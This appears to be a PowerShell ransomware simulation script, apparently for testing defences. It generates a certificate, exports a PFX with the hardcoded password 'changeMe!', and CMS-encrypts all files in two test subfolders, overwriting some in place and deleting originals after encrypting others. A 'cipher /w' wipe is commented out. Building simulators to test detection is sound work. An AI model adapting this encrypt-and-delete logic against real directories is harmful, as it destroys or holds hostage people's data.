
$dir_encryptReplace = "encryptReplace"
$dir_encryptDelete = "encryptDelete"

$cert_subject = "ransomware_sim_cert"
$cert_pass = "changeMe!"
$cert_store = "Cert:\CurrentUser\My"
$cert_export_cer = "public_key.cer"
$cert_export_pfx = "certificate.pfx"

# Certificate: Create > Export > Remove from storage > Import public key only
$cert = New-SelfSignedCertificate -DnsName $cert_subject -CertStoreLocation $cert_store -KeyUsage KeyEncipherment, DataEncipherment, KeyAgreement -Type DocumentEncryptionCert
$pass = ConvertTo-SecureString -String $cert_pass -Force -AsPlainText
Export-Certificate -Cert $cert -FilePath $cert_export_cer
Export-PfxCertificate -Cert $cert -Password $pass -FilePath $cert_export_pfx
$cert | Remove-Item
$cert = Import-Certificate -FilePath $cert_export_cer -CertStoreLocation $cert_store

# Encrypt replacing file
$path=Join-Path -Path "$(Get-Location)" -ChildPath $dir_encryptReplace
$files = Get-ChildItem $path -Recurse -Force -Attributes !Directory
foreach ($file in $files) {
    Get-Content $file.FullName | Protect-CmsMessage -To $cert.Subject -OutFile $file.FullName
}

# Encrypt to new file > remove original > safe delete path
$path=Join-Path -Path "$(Get-Location)" -ChildPath $dir_encryptDelete
$files = Get-ChildItem $path -Recurse -Force -Attributes !Directory
foreach ($file in $files) {
    Get-Content $file.FullName | Protect-CmsMessage -To $cert.Subject -OutFile "$($file.FullName).asr"
    $file | Remove-Item
}
#cipher /w:$path

# Remove certificate from storage
$cert | Remove-Item